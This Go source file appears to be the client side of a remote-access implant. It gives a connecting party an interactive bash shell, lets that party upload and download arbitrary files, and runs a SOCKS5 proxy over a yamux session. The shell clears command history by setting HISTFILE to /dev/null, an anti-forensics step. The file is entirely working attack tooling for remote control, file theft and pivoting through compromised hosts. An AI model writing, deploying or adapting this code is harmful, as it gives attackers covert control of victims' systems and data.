package client

import (
	"io"
	"io/ioutil"
	"log"
	"net"
	"os"
	"os/exec"
	"strings"

	gosocks5 "github.com/armon/go-socks5"
	"github.com/creack/pty"
	"github.com/hashicorp/yamux"
)

func GetInteractiveShell(conn net.Conn) {
	paramBuffer := make([]byte, 128)

	paramLen, err := conn.Read(paramBuffer)

	if err != nil {
		return
	}

	termEnv := strings.TrimSpace(string(paramBuffer[:paramLen]))

	_, err = conn.Read(paramBuffer)

	if err != nil {
		return
	}

	var ws pty.Winsize

	ws.Rows = uint16(paramBuffer[0]) + uint16(paramBuffer[1]<<8)
	ws.Cols = uint16(paramBuffer[2]) + uint16(paramBuffer[3]<<8)

	ws.X = 0
	ws.Y = 0

	c := exec.Command("/bin/sh", "-c", "exec bash --login")

	c.Env = append(c.Env, "HISTFILE=/dev/null")

	c.Env = append(c.Env, "TERM="+termEnv)

	ptmx, err := pty.Start(c)
	if err != nil {
		return
	}
	defer func() { _ = ptmx.Close() }()

	_ = pty.Setsize(ptmx, &ws)

	go func() {
		for {
			buff := make([]byte, 1024)
			readLen, err := conn.Read(buff)
			if err != nil {
				break
			}
			if readLen > 0 {
				_, err = ptmx.Write(buff[:readLen])
				if err != nil {
					break
				}
			}
		}
		//不需要对输入做控制的可以直接采用下面的方式
		//_, _ = io.Copy(ptmx, conn)
	}()

	_, _ = io.Copy(conn, ptmx)

}

func UploadFile(conn net.Conn) {
	uploadChannel := make([]byte, 1024)

	read_len, err := conn.Read(uploadChannel)

	if err != nil {
		return
	}

	filePath := strings.TrimSpace(string(uploadChannel[:read_len]))

	f, _ := os.Create(filePath)

	defer f.Close()

	_, _ = io.Copy(f, conn)
}

func DownloadFile(conn net.Conn) {
	uploadChannel := make([]byte, 1024)

	read_len, err := conn.Read(uploadChannel)

	if err != nil {
		return
	}

	filePath := strings.TrimSpace(string(uploadChannel[:read_len]))

	f, err := os.Open(filePath)

	if err != nil {
		return
	}

	defer f.Close()

	_, _ = io.Copy(conn, f)

}

func RunSocks5Proxy(conn net.Conn) {

	socksChannel := make([]byte, 1024)

	readLen, err := conn.Read(socksChannel)

	if err != nil {
		return
	}

	user := strings.TrimSpace(string(socksChannel[:readLen]))

	readLen, err = conn.Read(socksChannel)

	if err != nil {
		return
	}

	passwd := strings.TrimSpace(string(socksChannel[:readLen]))

	cfg := &gosocks5.Config{
		Logger: log.New(ioutil.Discard, "", log.LstdFlags),
	}

	cfg.Credentials = gosocks5.StaticCredentials(map[string]string{user: passwd})

	sp, err := gosocks5.New(cfg)

	session, err := yamux.Server(conn, nil)
	if err != nil {
		return
	}

	for {
		stream, err := session.Accept()
		if err != nil {
			return
		}
		go func() {
			err = sp.ServeConn(stream)
			if err != nil {
				return
			}
		}()
	}

}
